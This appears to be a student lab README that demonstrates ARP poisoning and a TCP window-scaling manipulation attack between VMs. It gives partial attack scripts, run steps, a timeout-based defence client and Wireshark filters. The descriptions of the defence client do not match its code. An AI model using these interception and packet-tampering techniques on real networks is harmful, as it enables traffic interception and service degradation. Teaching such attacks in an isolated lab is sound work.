# MITM TCP Lab: Window Scaling Attack & ARP Poisoning


## Detailed Lab Process: ARP Poisoning, TCP Window Scaling Attack, and Defence

### 1. ARP Poisoning (`attacker-code/tcp_arp_poison.py`)
```python
import socket
import struct
import time

def send_arp_poison(target_ip, spoof_ip, interface):
    # Build ARP reply packet
    # ...existing code to construct ARP reply...
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    while True:
        sock.send(arp_packet)
        time.sleep(2)

# Poison both client and server ARP tables
send_arp_poison(client_ip, server_ip, interface)
send_arp_poison(server_ip, client_ip, interface)
```
- The attacker sends spoofed ARP replies to both the client and server, claiming to be the other party.
- This poisons their ARP tables, causing all traffic between them to be routed through the attacker (MITM).
- The attacker can now intercept, modify, or forward packets as desired.

### 2. TCP Window Scaling Attack (`attacker-code/tcp_window_attack.py`)
```python
# Sniff and filter TCP SYN/SYN-ACK packets
packet, _ = sock_sniff.recvfrom(65535)
ip_header = packet[14:34]
iph = struct.unpack(IP_HEADER, ip_header)
if iph[6] != 6:  # Not TCP
    continue
src_ip = socket.inet_ntoa(iph[8])
dst_ip = socket.inet_ntoa(iph[9])

# Randomly modify 50% of SYN/SYN-ACK packets
if (src_ip == client_ip and dst_ip == server_ip) or (src_ip == server_ip and dst_ip == client_ip):
    parsed = parse_tcp_packet(packet[14:])
    if parsed['flags'] == 0x02 or parsed['flags'] == 0x12:
        if random.random() < 0.5:
            print(f"Intercepted SYN/SYN-ACK (MODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
            new_packet = craft_tcp_packet(parsed, window_scale=0)
            sock_send.sendto(new_packet, (parsed['dst_ip'], 0))
            print("Sent modified packet with Window Scale = 0")
        else:
            print(f"Intercepted SYN/SYN-ACK (UNMODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
            sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
    else:
        sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
```
- The attacker sniffs packets on the network interface and filters for TCP SYN and SYN-ACK packets between the client and server.
- For each handshake packet, the attacker randomly modifies 50% of them, setting the TCP window scale option to zero (disabling window scaling).
- Modified packets are sent to the destination, while unmodified packets are forwarded as-is.
- This limits the effective TCP window size for about half of the connections, reducing throughput and degrading performance.

### 3. TCP Server (`server-code/tcp_server.py`)
```python
import socket
import threading

def handle_client(client_socket, client_address):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        message = data.decode()
        print(f"Received from {client_address}: {message}")
        response = f"Server received: {message}"
        client_socket.send(response.encode())
    client_socket.close()

def tcp_server(host="0.0.0.0", port=8080):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"TCP Server listening on {host}:{port}")
    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket, client_address), daemon=True).start()
```
- The server listens for incoming TCP connections and handles each client in a separate thread.
- It receives messages from the client and sends responses back.
- The server is unaware of the attack but may experience reduced throughput due to the limited window size on affected connections.

### 4. TCP Client (`client-code/tcp_client.py`)
```python
import socket

def tcp_client(server_ip="192.168.56.20", server_port=8080):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    messages = ["Hello Server!", "This is a test message", "Testing TCP window scaling", "MITM Lab Test Data"]
    for message in messages:
        print(f"Sending: {message}")
        client_socket.send(message.encode())
        response = client_socket.recv(1024)
        print(f"Received: {response.decode()}")
    client_socket.close()
```
- The client connects to the server and sends a series of test messages, waiting for responses.
- Under attack, the client may experience timeouts and slow communication on connections where window scaling is disabled.

### 5. TCP Client Defence (`client-code/tcp_client_defence.py`)
```python
for i, message in enumerate(messages, 1):
    print(f"Sending message {i}: {message}")
    client_socket.send(message.encode())
    total_sent += 1
    try:
        client_socket.settimeout(3)
        response = client_socket.recv(1024)
        print(f"Received response: {response.decode()}")
        timeout_count = 0  # Reset on success
    except socket.timeout:
        timeout_count += 1
        total_timeouts += 1
        print("No response received (timeout)")
        if total_sent > 3 and total_timeouts / total_sent > 0.3:
            print("CRITICAL: High rate of timeouts detected (>30%). Possible TCP window size zero attack!")
            print("Attempting to reconnect...")
            client_socket.close()
            time.sleep(2)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            timeout_count = 0
            total_timeouts = 0
            total_sent = 0
        elif timeout_count >= 3:
            print("WARNING: Multiple consecutive timeouts. Possible TCP window size zero attack!")
            print("Attempting to reconnect...")
            client_socket.close()
            time.sleep(2)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            timeout_count = 0
    time.sleep(2)
```
- The defence client monitors for timeouts and tracks the ratio of timeouts to total messages sent.
- If more than 30% of messages result in timeouts, or if there are 3 consecutive timeouts, it warns the user of a possible window scaling attack and attempts to reconnect.
- This practical approach helps detect and mitigate the attack by avoiding affected connections and informing the user.

---

### TCP Client Defence Logic Explained

The defence client (`tcp_client_defence.py`) is designed to detect and mitigate the effects of a TCP window scaling attack. Here is how it works:

- **Message Generation:**
  - Sends 20 messages, each 2KB, to stress the connection and make attack effects visible.
- **Timeout Detection:**
  - Uses a short timeout (1 second) for each response, making timeouts more likely if the attack is active.
- **Defence Logic:**
  - If more than 30% of messages time out, or if there are 3 consecutive timeouts, the client prints a warning about a possible TCP window size zero attack and automatically reconnects to the server.
  - This helps the client avoid persistently bad connections and demonstrates detection and mitigation.
- **Summary:**
  - At the end, prints a summary of sent messages, timeouts, and reconnections, providing clear evidence of the attack's impact and the defence in action.

This logic makes the attack's effect visible in both the console and Wireshark, and demonstrates a practical approach to detecting and recovering from TCP window scaling attacks.

---

## Summary Table
| Component         | What It Does                                              | How It Works                                                      | Result                                    |
|-------------------|----------------------------------------------------------|-------------------------------------------------------------------|--------------------------------------------|
| **ARP Poisoning** | MITM positioning                                         | Spoofs ARP replies to client/server                               | Attacker intercepts all traffic            |
| **Window Attack** | Degrades TCP performance                                 | Randomly disables window scaling on 50% of handshakes             | Lower throughput, unpredictable performance|
| **Server**        | Handles client connections                               | Receives and responds to messages                                 | May experience reduced throughput          |
| **Client**        | Sends messages to server                                 | Connects and communicates                                         | May see timeouts and slow responses        |
| **Defence Client**| Detects and mitigates attack                             | Monitors timeouts, warns user, reconnects                         | Detects attack symptoms, attempts recovery |

---

1. What is TCP Window Scaling (Briefly)?

"At its core, TCP Window Scaling is a crucial feature that allows modern networks to achieve high speeds. Without it, TCP connections are limited to a very small 'data-in-flight' capacity (around 64 Kilobytes). Window Scaling effectively multiplies this capacity, allowing much more data to be sent before an acknowledgment is needed, making high-speed, long-distance communication efficient. This capability is negotiated right at the start of a TCP connection, during the SYN/SYN-ACK handshake."

2. What I Have Done (The Attack):

"My demonstration involves a Man-in-the-Middle (MITM) attack. I've used ARP poisoning to position my attacker machine directly between a client and a server. This means all their network traffic passes through my attacker."

"Once in the middle, my attacker actively intercepts the initial SYN and SYN-ACK packets that are crucial for setting up a TCP connection. These are the packets where the Window Scale option is negotiated. My attack script specifically modifies these packets, for approximately half of the connections, to effectively disable TCP Window Scaling by setting the negotiation option to zero."

"The result is that for those modified connections, the TCP communication is throttled back to that old, inefficient 64KB window limit. This drastically reduces the connection's effective speed and capacity."

3. How I Am Validating (The Proof):

"I'm validating the attack's success by observing the network traffic using Wireshark."

"1.  ARP Poisoning Confirmation: First, by simply running Wireshark on my attacker machine and seeing all the traffic flowing between the client and server, it confirms my MITM position is active."

"2.  Direct Attack Evidence (Window Scale Manipulation):
* By applying the Wireshark filter: (ip.addr == 192.168.56.10 or ip.addr == 192.168.56.20) and (tcp.flags.syn == 1 or tcp.flags.syn == 1 and tcp.flags.ack == 1)
* I can observe the SYN and SYN-ACK packets. I'll see some packets where the 'Window Scale' option (e.g., WS=128) is present, indicating normal negotiation.
* Crucially, for the packets my attacker modified, you'll notice the absence of this large window scale, or even small Win= values displayed directly. This confirms my script successfully tampered with the negotiation for those connections."

"3.  Impact Evidence (Performance Degradation):
* When I then filter for: `tcp.analysis.retransmission`
  * You'll see a massive number of red-highlighted `[TCP Retransmission]` packets. This is the most direct evidence of the attack's success – the connections are struggling severely, constantly re-sending data because the limited window prevents efficient flow.
* Furthermore, if I filter for: `tcp.window_size == 0`
  * You'll also see instances where endpoints are forced to advertise a 'Zero Window', meaning they can't accept any more data. This is a severe symptom of the connection failing due to the attack, often leading to connections being abruptly reset.

These observations in Wireshark clearly show that the TCP Window Scaling Attack is effective in degrading connection performance and ultimately causing communication failures."


## Configuration & Setup Guide

This guide provides step-by-step instructions to set up and run the virtual lab environment for the TCP Window Scaling Attack demonstration. All commands are copy-paste ready for your convenience.

---

### 1. Import and Prepare Virtual Machines
- Import the Attacker, Client, and Server VMs using the `.vbox` files in your VM storage directory.
- In VirtualBox, go to **VM Settings → Shared Folders → Machine Folders → Add new shared folder**:
  - **Folder Path:** `/home/ninad-nobo/MITM-TCP-Lab/window-scaling-attack/<VM-Name>-code`
  - **Folder Name:** `mitm-lab`
  - **Mount point:** `/media/sf_mitm-lab`
  - Check: Auto-mount
  - Check: Make Permanent
- Enable VirtualBox Features:
  - VM Settings → General → Advanced:
    - **Shared Clipboard: Bidirectional** (enables copy-paste between host and VM)
    - **Drag'n'Drop: Bidirectional**

> **Copy-paste is enabled after this step.**

---

### 2. Initial Setup: Use NAT for Internet Access
- Shutdown the VM.
- In VirtualBox: Settings → Network → Adapter 1 → Set to **NAT**
- Start the VM.

#### Install Required Packages
- **Attacker VM:**
  ```bash
  sudo apt update
  sudo apt install -y python3-pip scapy tcpdump wireshark-tui nmap wireshark tshark python3-scapy python3-netifaces
  ```
- **Client & Server VMs:**
  ```bash
  sudo apt update
  sudo apt install -y python3-pip
  ```

#### Install VirtualBox Guest Additions
  ```bash
  sudo apt install -y build-essential dkms linux-headers-$(uname -r) bzip2
  # Insert Guest Additions CD: Devices → Insert Guest Additions CD Image
  sudo mkdir -p /mnt/cdrom
  sudo mount /dev/cdrom /mnt/cdrom
  sudo /mnt/cdrom/VBoxLinuxAdditions.run
  sudo usermod -aG vboxsf $USER
  sudo reboot
  ```

#### Start VirtualBox Client Services (after reboot)
  ```bash
  VBoxClient --clipboard &
  VBoxClient --draganddrop &
  VBoxClient --seamless &
  ```

#### Mount Shared Folder (if not auto-mounted)
  ```bash
  sudo mkdir -p /media/sf_mitm-lab
  sudo mount -t vboxsf mitm-lab /media/sf_mitm-lab
  ```

#### Make Scripts Executable
  ```bash
  cd /media/sf_mitm-lab
  chmod +x *.py
  ```

---

### 3. Switch to Host-Only Network for Lab
- Shutdown the VM.
- In VirtualBox: Settings → Network → Adapter 1 → Set to **Host-Only Adapter** (vboxnet0)
- Start the VM.

---

### 4. Configure Static IP Addresses
On each VM, open the netplan configuration file for editing:
  ```bash
  sudo nano /etc/netplan/01-netcfg.yaml
  ```
Paste the following content according to the VM role:
- **Client VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.10/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
- **Server VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.20/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
- **Attacker VM:**
  ```yaml
  network:
    ethernets:
      enp0s3:
        addresses: [192.168.56.30/24]
        gateway4: 192.168.56.1
        nameservers:
          addresses: [8.8.8.8]
    version: 2
  ```
Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`), then apply the configuration:
  ```bash
  sudo netplan apply
  ```

---

### 5. Enable IP Forwarding (Attacker VM Only)
  ```bash
  echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
  sudo sysctl -p
  ```

---

### 6. Test Network Configuration
On each VM, run:
  ```bash
  ping -c 2 192.168.56.1
  ping -c 2 192.168.56.10
  ping -c 2 192.168.56.20
  ping -c 2 192.168.56.30

  ip addr show enp0s3
  ip route show
  ```

---

## Project Folder Structure

```
window-scaling-attack/
├── README.md
├── report1.pdf
├── attacker-code/
│   ├── tcp_arp_poison.py
│   └── tcp_window_attack.py
├── client-code/
│   ├── tcp_client.py
│   └── tcp_client_defence.py
├── server-code/
│   └── tcp_server.py
```

---

## Lab Run Instructions

### Step 0: Unload KVM modules on your host machine

  ```bash
  sudo rmmod kvm_intel
  sudo rmmod kvm
  virtualbox
  ```

### Step 1: Verify Connectivity
- **Server VM (Terminal 1):**
  ```bash
  ping -c 4 192.168.56.10  # Ping Client
  ```
- **Client VM (Terminal 1):**
  ```bash
  ping -c 4 192.168.56.20  # Ping Server
  ```

### Step 2: Check ARP Tables
- **Server VM (Terminal 1):**
  ```bash
  ip neigh
  ```
- **Client VM (Terminal 1):**
  ```bash
  ip neigh
  ```

### Step 3: Run ARP Poisoning
- **Attacker VM (Terminal 1):**
  ```bash
  cd /media/sf_mitm-lab
  sudo python3 tcp_arp_poison.py
  ```

### Step 4: Confirm ARP Poisoning
- **Server VM (Terminal 1):**
  ```bash
  ip neigh  # Should show Attacker's MAC for Client IP
  ```
- **Client VM (Terminal 1):**
  ```bash
  ip neigh  # Should show Attacker's MAC for Server IP
  ```

---

## Run with Normal Client

### Step 5: Start TCP Server
- **Server VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  python3 tcp_server.py
  ```

### Step 6: Start Window Scaling Attack
- **Attacker VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  sudo python3 tcp_window_attack.py
  ```

### Step 7: Start Wireshark (for normal client run)
- **Attacker VM (Terminal 3):**
  ```bash
  wireshark -k -i enp0s3 &
  # Use filter: tcp.window_size == 0
  ```

### Step 8: Capture Packets with tcpdump (for normal client run)
- **Attacker VM (Terminal 4):**
  ```bash
  sudo tcpdump -i enp0s3 -w attack-client.pcap
  ```

### Step 9: Start TCP Client
- **Client VM (Terminal 2):**
  ```bash
  cd /media/sf_mitm-lab
  python3 tcp_client.py
  ```

### Step 10: Stop/Close Terminals after Normal Client Run
- **Client VM (Terminal 2):** Stop/close after client finishes.
- **Attacker VM (Terminal 2, 3, 4):** Stop/close after attack and capture are complete.
- **Server VM (Terminal 2):** Stop/close after server finishes.

---

## Run with Defence Client

### Step 11: Restart tcpdump for defence run (optional)
- **Attacker VM (Terminal 4):**
  ```bash
  sudo tcpdump -i enp0s3 -w attack-defence.pcap
  ```

### Step 12: (Optional) Restart Wireshark for defence run
- **Attacker VM (Terminal 3):**
  ```bash
  wireshark -k -i enp0s3 &
  # Use filter: tcp.window_size == 0
  ```

### Step 13: Start Defence Client
- **Client VM (Terminal 3):**
  ```bash
  cd /media/sf_mitm-lab/client-code
  python3 tcp_client_defence.py
  ```

### Step 14: Stop/Close Terminals after Defence Client Run
- **Client VM (Terminal 3):** Stop/close after defence client finishes.
- **Attacker VM (Terminal 3, 4):** Stop/close after capture and analysis are complete.

---

### Wireshark Filters for Validation and Demonstration

**1. To see all SYN and SYN-ACK packets between client and server:**

```
(ip.addr == 192.168.56.10 or ip.addr == 192.168.56.20) and (tcp.flags.syn == 1)
```
*Expected Behavior/Observation:* You will see the initial handshake packets. Under attack, some SYN/SYN-ACK packets will be missing the Window Scale option or have WS=0, indicating the attack is modifying the handshake.

**2. To see Window Scale option negotiation (look for presence/absence of WS):**

```
tcp.options.wscale
```
*Expected Behavior/Observation:* Normally, you should see WS values like 7 (WS=128) in the handshake. Under attack, some connections will have no WS option or WS=0, confirming the attack is disabling window scaling.

**3. To see all retransmissions (evidence of performance degradation):**

```
tcp.analysis.retransmission
```
*Expected Behavior/Observation:* You will see many red-highlighted retransmission packets during the attack, showing that the limited window is causing data to be resent due to congestion and slow acknowledgments.

**4. To see all zero window advertisements (severe congestion):**

```
tcp.window_size == 0
```
*Expected Behavior/Observation:* You will observe packets where the window size is zero, meaning the receiver cannot accept more data. This is a sign of severe congestion and is more frequent under attack.

**5. To see all traffic between client and server (for general inspection):**

```
ip.addr == 192.168.56.10 or ip.addr == 192.168.56.20
```
*Expected Behavior/Observation:* You can inspect all packets between the client and server. Under attack, you will notice increased delays, retransmissions, and possibly abrupt connection resets.

**How to use:**
- Apply these filters in Wireshark to validate each stage of the attack and defence demonstration.
- Use the Window Scale filter to confirm the attack is modifying the handshake.
- Use retransmission and zero window filters to see the impact on performance.
- Compare normal and attack runs to clearly observe the difference.

---

### How to Stop/Close and Capture

**tcpdump (Attacker VM, Terminal 4):**
- To stop and save the capture, press `Ctrl+C` in the terminal running tcpdump.
- The `.pcap` file (e.g., `attack-client.pcap` or `attack-defence.pcap`) will be saved in your current directory.

**Wireshark (Attacker VM, Terminal 3):**
- To stop live capture, click the red square “Stop” button in the Wireshark window.
- To close Wireshark, simply close the application window.

**Python scripts (Client/Server/Attacker):**
- To stop a running Python script (e.g., `tcp_client.py`, `tcp_client_defence.py`, `tcp_server.py`, `tcp_window_attack.py`), press `Ctrl+C` in the terminal where it is running.
- Then close the terminal window if you are done.

**Summary:**
1. Press `Ctrl+C` in each terminal running a script or tcpdump to stop the process.
2. Close the terminal window if you no longer need it.
3. In Wireshark, click “Stop” and close the window.

Your capture files will be available for analysis in Wireshark or other tools.

---